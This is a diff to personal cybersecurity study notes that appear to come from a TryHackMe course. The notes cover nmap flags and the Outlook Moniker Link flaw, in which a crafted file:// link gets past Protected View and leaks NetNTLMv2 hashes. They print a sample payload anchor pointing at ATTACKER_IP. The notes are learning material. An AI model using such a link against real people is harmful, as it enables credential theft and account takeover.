@@ -266,9 +266,19 @@ an additional column 'VERSION' appears same interface with interface that used -
 ex) [nmap -sS -sV (IP ad)]
 -Pn : scan hosts including didn't reply
 
+20250213
+-Exploitation basics-
+Moniker Link : approaching outer resource by some protocols ex)wfile:// , http:// ..etc, 
+Moniker link Attack in Outlook: An attacker can abuse this by sending an email that contains a malicious Moniker Link to a victim,
+resulting in Outlook sending the user's NTLM credentials to the attacker once the hyperlink is clicked.
 
-
-
+How Monker link works in Outlook
+by using the file:// in hyperlink, Attacker can instruct Outlook to attempt to access a file.
+Usually the SMB(Server Message Block) protocol used and requires authentification but Outlook's 'protected view' catches and blocks this attempt
+Vulnerability here(thm) exists by modifying hyperlink the ! special character and some text in Attacker's Moniker Link which results in bypassing Outlook’s Protected View. 
+ex): <a href="file://ATTACKER_IP/test!exploit>Click me</a>.
+by these sequences, attacker can get victim's 'NetNTLMv2 hash'. so attacker can authentificate victim's account. 
+*NetNTLMv2 hash: used for network authentification
 
 
 
